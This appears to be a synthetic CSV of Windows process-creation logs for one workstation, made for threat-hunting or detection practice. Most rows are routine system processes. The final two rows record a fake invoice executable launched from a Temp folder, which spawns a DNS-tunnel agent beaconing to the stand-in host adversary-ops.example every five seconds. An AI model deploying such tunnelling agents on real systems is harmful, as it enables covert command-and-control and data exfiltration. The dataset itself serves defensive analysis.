timestamp,host,user,pid,parent_pid,process_name,command_line,integrity_level
2026-08-15T22:12:51Z,AD-WS-14,carlos.mendez,2055,930,svchost.exe,C:\Windows\System32\svchost.exe,Medium
2026-08-15T22:13:00Z,AD-WS-14,carlos.mendez,2056,987,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:14:36Z,AD-WS-14,carlos.mendez,2057,979,svchost.exe,C:\Windows\System32\svchost.exe,Medium
2026-08-15T22:14:42Z,AD-WS-14,carlos.mendez,2058,971,explorer.exe,C:\Windows\System32\explorer.exe,Medium
2026-08-15T22:14:48Z,AD-WS-14,carlos.mendez,2059,687,explorer.exe,C:\Windows\System32\explorer.exe,Medium
2026-08-15T22:14:49Z,AD-WS-14,carlos.mendez,2060,674,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:14:50Z,AD-WS-14,carlos.mendez,2061,533,svchost.exe,C:\Windows\System32\svchost.exe,Medium
2026-08-15T22:15:03Z,AD-WS-14,carlos.mendez,2062,446,SearchApp.exe,C:\Windows\System32\SearchApp.exe,Medium
2026-08-15T22:15:15Z,AD-WS-14,carlos.mendez,2063,925,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:15:17Z,AD-WS-14,carlos.mendez,2064,740,explorer.exe,C:\Windows\System32\explorer.exe,Medium
2026-08-15T22:15:43Z,AD-WS-14,carlos.mendez,2065,968,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:15:52Z,AD-WS-14,carlos.mendez,2066,955,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:16:06Z,AD-WS-14,carlos.mendez,2067,980,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:16:56Z,AD-WS-14,carlos.mendez,2068,688,SearchApp.exe,C:\Windows\System32\SearchApp.exe,Medium
2026-08-15T22:16:59Z,AD-WS-14,carlos.mendez,2069,617,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:17:09Z,AD-WS-14,carlos.mendez,2070,712,chrome.exe,C:\Windows\System32\chrome.exe,Medium
2026-08-15T22:17:25Z,AD-WS-14,carlos.mendez,2071,921,svchost.exe,C:\Windows\System32\svchost.exe,Medium
2026-08-15T22:17:41Z,AD-WS-14,carlos.mendez,2072,722,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:17:54Z,AD-WS-14,carlos.mendez,2073,961,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:18:09Z,AD-WS-14,carlos.mendez,2074,562,chrome.exe,C:\Windows\System32\chrome.exe,Medium
2026-08-15T22:18:18Z,AD-WS-14,carlos.mendez,2075,401,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:18:23Z,AD-WS-14,carlos.mendez,2076,771,chrome.exe,C:\Windows\System32\chrome.exe,Medium
2026-08-15T22:18:39Z,AD-WS-14,carlos.mendez,2077,657,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:18:40Z,AD-WS-14,carlos.mendez,2078,583,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe,Medium
2026-08-15T22:18:42Z,AD-WS-14,carlos.mendez,2079,907,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe,Medium
2026-08-15T22:19:05Z,AD-WS-14,carlos.mendez,2080,878,SearchApp.exe,C:\Windows\System32\SearchApp.exe,Medium
2026-08-15T22:19:34Z,AD-WS-14,carlos.mendez,2081,747,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:20:10Z,AD-WS-14,carlos.mendez,2082,862,SearchApp.exe,C:\Windows\System32\SearchApp.exe,Medium
2026-08-15T22:20:50Z,AD-WS-14,carlos.mendez,2083,632,chrome.exe,C:\Windows\System32\chrome.exe,Medium
2026-08-15T22:22:55Z,AD-WS-14,carlos.mendez,2084,933,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:22:59Z,AD-WS-14,carlos.mendez,2085,818,SearchApp.exe,C:\Windows\System32\SearchApp.exe,Medium
2026-08-15T22:23:31Z,AD-WS-14,carlos.mendez,2086,929,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe,Medium
2026-08-15T22:23:48Z,AD-WS-14,carlos.mendez,2087,719,svchost.exe,C:\Windows\System32\svchost.exe,Medium
2026-08-15T22:24:25Z,AD-WS-14,carlos.mendez,2088,617,chrome.exe,C:\Windows\System32\chrome.exe,Medium
2026-08-15T22:25:24Z,AD-WS-14,carlos.mendez,2089,533,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:25:37Z,AD-WS-14,carlos.mendez,2090,714,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:25:40Z,AD-WS-14,carlos.mendez,2091,489,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:26:44Z,AD-WS-14,carlos.mendez,2092,604,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:26:45Z,AD-WS-14,carlos.mendez,2093,607,cmd.exe,C:\Windows\System32\cmd.exe,Medium
2026-08-15T22:27:53Z,AD-WS-14,carlos.mendez,2094,608,SearchApp.exe,C:\Windows\System32\SearchApp.exe,Medium
2026-08-15T22:28:44Z,AD-WS-14,carlos.mendez,2095,577,explorer.exe,C:\Windows\System32\explorer.exe,Medium
2026-08-15T22:28:45Z,AD-WS-14,carlos.mendez,2096,710,SearchApp.exe,C:\Windows\System32\SearchApp.exe,Medium
2026-08-15T22:28:46Z,AD-WS-14,carlos.mendez,2097,453,conhost.exe,C:\Windows\System32\conhost.exe,Medium
2026-08-15T22:29:15Z,AD-WS-14,carlos.mendez,2098,498,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe,Medium
2026-08-15T22:29:27Z,AD-WS-14,carlos.mendez,2099,706,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe,Medium
2026-08-16T00:54:30Z,AD-WS-14,carlos.mendez,4520,3412,wordview.exe,"C:\Users\carlos.mendez\AppData\Local\Temp\invoice_doc.exe",Medium
2026-08-16T00:59:15Z,AD-WS-14,carlos.mendez,5104,4520,dns-tunnel.exe,"C:\Users\carlos.mendez\AppData\Roaming\dns-agent.exe -domain adversary-ops.example -interval 5s",Medium
